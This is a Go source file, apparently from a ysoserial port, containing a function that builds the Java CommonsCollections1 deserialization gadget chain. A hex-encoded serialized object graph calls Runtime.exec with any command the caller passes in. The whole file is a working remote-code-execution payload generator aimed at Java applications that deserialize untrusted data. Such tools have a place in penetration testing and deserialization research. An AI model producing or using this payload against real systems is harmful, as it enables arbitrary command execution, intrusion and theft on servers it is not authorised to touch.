package gadget

import (
	"bytes"
	"encoding/hex"
	"github.com/EmYiQing/Gososerial/ysoserial/util"
	"strings"
)

func GetCommonsCollections1(cmd string) []byte {
	prefix := "ACED00057372003273756E2E7265666C6563742E616E6E6F74" +
		"6174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48" +
		"616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256" +
		"616C75657374000F4C6A6176612F7574696C2F4D61703B4C000474" +
		"7970657400114C6A6176612F6C616E672F436C6173733B7870737D" +
		"00000001000D6A6176612E7574696C2E4D6170787200176A617661" +
		"2E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB" +
		"0200014C0001687400254C6A6176612F6C616E672F7265666C6563" +
		"742F496E766F636174696F6E48616E646C65723B78707371007E00" +
		"007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C" +
		"6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910" +
		"940300014C0007666163746F727974002C4C6F72672F6170616368" +
		"652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73" +
		"666F726D65723B78707372003A6F72672E6170616368652E636F6D" +
		"6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E43" +
		"6861696E65645472616E73666F726D657230C797EC287A97040200" +
		"015B000D695472616E73666F726D65727374002D5B4C6F72672F61" +
		"70616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F54" +
		"72616E73666F726D65723B78707572002D5B4C6F72672E61706163" +
		"68652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E" +
		"73666F726D65723BBD562AF1D83418990200007870000000057372" +
		"003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C6563" +
		"74696F6E732E66756E63746F72732E436F6E7374616E745472616E" +
		"73666F726D6572587690114102B1940200014C000969436F6E7374" +
		"616E747400124C6A6176612F6C616E672F4F626A6563743B787076" +
		"7200116A6176612E6C616E672E52756E74696D6500000000000000" +
		"0000000078707372003A6F72672E6170616368652E636F6D6D6F6E" +
		"732E636F6C6C656374696F6E732E66756E63746F72732E496E766F" +
		"6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B00" +
		"0569417267737400135B4C6A6176612F6C616E672F4F626A656374" +
		"3B4C000B694D6574686F644E616D657400124C6A6176612F6C616E" +
		"672F537472696E673B5B000B69506172616D54797065737400125B" +
		"4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A61" +
		"76612E6C616E672E4F626A6563743B90CE589F1073296C02000078" +
		"700000000274000A67657452756E74696D65757200125B4C6A6176" +
		"612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000" +
		"0000007400096765744D6574686F647571007E001E000000027672" +
		"00106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202" +
		"000078707671007E001E7371007E00167571007E001B0000000270" +
		"7571007E001B00000000740006696E766F6B657571007E001E0000" +
		"0002767200106A6176612E6C616E672E4F626A6563740000000000" +
		"00000000000078707671007E001B7371007E0016757200135B4C6A" +
		"6176612E6C616E672E537472696E673BADD256E7E91D7B47020000" +
		"787000000001"
	finalCmd := bytes.Buffer{}
	finalCmd.WriteString("74")
	data := strings.ToUpper(hex.EncodeToString([]byte(cmd)))
	if len(data)/2 > 0xFFFF {
		return []byte{}
	}
	dataLen := util.Int16ToBytes(uint16(len(data) / 2))
	finalCmd.WriteString(dataLen)
	finalCmd.WriteString(data)
	suffix := "740004657865637571007E001E0000000171007E0023737100" +
		"7E0011737200116A6176612E6C616E672E496E746567657212E2A0" +
		"A4F781873802000149000576616C7565787200106A6176612E6C61" +
		"6E672E4E756D62657286AC951D0B94E08B02000078700000000173" +
		"7200116A6176612E7574696C2E486173684D61700507DAC1C31660" +
		"D103000246000A6C6F6164466163746F724900097468726573686F" +
		"6C6478703F40000000000000770800000010000000007878767200" +
		"126A6176612E6C616E672E4F766572726964650000000000000000" +
		"000000787071007E003A"
	ser, err := hex.DecodeString(prefix + finalCmd.String() + suffix)
	if err != nil {
		return []byte{}
	}
	return ser
}